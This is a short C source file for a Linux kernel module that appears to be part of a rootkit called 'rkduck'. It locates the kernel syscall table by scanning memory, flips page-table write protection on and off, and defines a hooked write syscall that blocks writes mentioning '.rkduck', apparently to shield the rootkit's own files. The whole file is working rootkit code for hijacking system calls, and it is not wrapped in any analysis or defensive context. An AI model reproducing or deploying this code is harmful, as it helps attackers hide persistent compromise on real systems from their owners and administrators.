#include "hijack.h"

ptr_t find_syscall_table(void) {
    ptr_t** sc_table;
    ptr_t addr = SCT_START_CHECK;
    
    while (addr < SCT_END_CHECK) {
        sc_table = (ptr_t**) addr;
        if (sc_table[__NR_close] == (ptr_t*) sys_close) {
            return (ptr_t) &sc_table[0];
        }

        addr += sizeof(void *);
    }
    return NULL;
}

int set_page_rw(ptr_t address) {
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);

	if (pte->pte &~ _PAGE_RW) {
		pte->pte |= _PAGE_RW;
	}

	return 0;
}

int set_page_ro(ptr_t address) {
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}

asmlinkage ssize_t duck_write(int fd, const char __user *buff, ssize_t count) {
	int r = 0;
	char *proc_protect = ".rkduck";
	char *kbuff = (char *) kmalloc(256, GFP_KERNEL);
	
	if (!copy_from_user(kbuff, buff, 255)) {
		if (strstr(kbuff, proc_protect)) {
			kfree(kbuff);
			return EEXIST;
		}

		r = (*original_write)(fd, buff, count);
		kfree(kbuff);
	}
		
	return r;
}